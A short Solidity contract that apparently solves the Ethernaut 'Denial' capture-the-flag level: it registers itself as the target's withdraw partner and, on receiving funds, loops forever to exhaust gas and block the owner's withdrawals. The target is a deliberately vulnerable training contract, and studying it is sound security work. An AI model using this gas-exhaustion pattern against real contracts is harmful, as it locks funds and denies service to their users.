//SPDX-License-Identifier: MIT

pragma solidity^0.8.0;

import {Denial} from "Ethernaut_Denial/Denial.sol";

contract attack {
    Denial target;
    uint256 counter;
    constructor(Denial _target) {
        target = _target;
    }
    function attackContract() public {
        target.setWithdrawPartner(address(this));
        target.withdraw();
    }
    receive() external payable {
        while(true) {
            counter++;
        }
    }
}